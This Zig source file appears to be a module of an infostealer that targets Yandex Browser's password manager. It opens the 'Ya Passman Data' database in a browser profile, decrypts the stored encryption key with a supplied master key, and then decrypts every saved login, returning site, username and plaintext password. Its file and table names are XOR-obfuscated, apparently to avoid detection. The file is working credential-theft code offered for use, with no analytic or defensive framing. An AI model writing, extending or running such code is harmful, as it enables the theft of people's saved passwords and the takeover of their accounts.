const std = @import("std");
const hash = @import("../types/hash.zig");
const sqLoot = @import("../parsers/sqLoot.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");
const file_io = @import("../parsers/file_io.zig");

const E = struct {
    pub const db_name = hash.xorEncrypt("Ya Passman Data");
    pub const meta = hash.xorEncrypt("meta");
    pub const local_encryptor_data = hash.xorEncrypt("local_encryptor_data");
    pub const logins = hash.xorEncrypt("logins");
};

pub const YandexPassmanData = struct {
    logins: [][]const u8,
};

pub fn collect(allocator: std.mem.Allocator, profile_path: []const u8, master_key: []const u8) !YandexPassmanData {
    var db_name_buf: [E.db_name.len]u8 = undefined;
    hash.xorDecrypt(&E.db_name, &db_name_buf);

    var meta_buf: [E.meta.len]u8 = undefined;
    hash.xorDecrypt(&E.meta, &meta_buf);

    var enc_key_buf: [E.local_encryptor_data.len]u8 = undefined;
    hash.xorDecrypt(&E.local_encryptor_data, &enc_key_buf);

    var logins_buf: [E.logins.len]u8 = undefined;
    hash.xorDecrypt(&E.logins, &logins_buf);

    const db_path = try std.fs.path.join(allocator, &[_][]const u8{ profile_path, &db_name_buf });
    defer allocator.free(db_path);

    const mf = file_io.MappedFile.open(db_path) orelse return error.DatabaseNotFound;
    defer mf.close();

    var db = try sqLoot.SqliteDb.open(allocator, mf.slice());
    defer db.deinit();

    const meta_rows = try db.readTable(&meta_buf);
    defer {
        for (meta_rows) |row| allocator.free(row);
        allocator.free(meta_rows);
    }

    var enc_data: ?[]const u8 = null;
    for (meta_rows) |row| {
        if (row.len >= 2 and row[0] == .text and std.mem.eql(u8, row[0].text, &enc_key_buf)) {
            enc_data = if (row[1] == .blob) row[1].blob else if (row[1] == .text) row[1].text else null;
            break;
        }
    }
    const blob = enc_data orelse return error.EncryptedDataNotFound;

    const v10_pos = std.mem.indexOf(u8, blob, "v10") orelse return error.VersionNotFound;
    const payload_start = v10_pos + 3;
    if (payload_start + 96 > blob.len) return error.InvalidPayload;
    const payload = blob[payload_start .. payload_start + 96];

    var master_arr: [32]u8 = undefined;
    @memcpy(&master_arr, master_key[0..@min(master_key.len, @as(usize, 32))]);

    var v10_blob: [3 + 12 + 68 + 16]u8 = undefined;
    @memcpy(v10_blob[0..3], "v10");
    @memcpy(v10_blob[3..15], payload[0..12]);
    @memcpy(v10_blob[15..83], payload[12..80]);
    @memcpy(v10_blob[83..99], payload[80..96]);

    var out_buf: [96]u8 = undefined;
    const decrypted = chrome_crypto.decryptPassword(&v10_blob, master_arr, &out_buf) orelse return error.DecryptionFailed;

    const magic = std.mem.readInt(i32, decrypted[0..4], .little);
    if (magic != 538050824) return error.InvalidMagic;

    const derived_key = decrypted[4..36];

    const login_rows = try db.readTable(&logins_buf);
    defer {
        for (login_rows) |row| allocator.free(row);
        allocator.free(login_rows);
    }

    var logins = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (logins.items) |item| allocator.free(item);
        logins.deinit();
    }

    for (login_rows) |row| {
        if (row.len < 3) continue;
        const origin = if (row[0] == .text) row[0].text else if (row[0] == .blob) row[0].blob else continue;
        const username = if (row[1] == .text) row[1].text else if (row[1] == .blob) row[1].blob else continue;
        const enc_pw = if (row[2] == .blob) row[2].blob else continue;

        var key_bytes: [32]u8 = undefined;
        @memcpy(&key_bytes, derived_key);

        var pw_out: [2048]u8 = undefined;
        const password = chrome_crypto.decryptPassword(enc_pw, key_bytes, &pw_out);

        const line = if (password) |pw|
            try std.fmt.allocPrint(allocator, "{s}\t{s}\t{s}", .{ origin, username, pw })
        else
            try std.fmt.allocPrint(allocator, "{s}\t{s}\t[DECRYPT_FAILED]", .{ origin, username });

        try logins.append(line);
    }

    return YandexPassmanData{ .logins = try logins.toOwnedSlice() };
}

test "collect handles missing database gracefully" {
    const result = collect(std.testing.allocator, "C:\\__nonexistent__", &[_]u8{0} ** 32);
    try std.testing.expect(result == error.DatabaseNotFound or result == error.OutOfMemory);
}
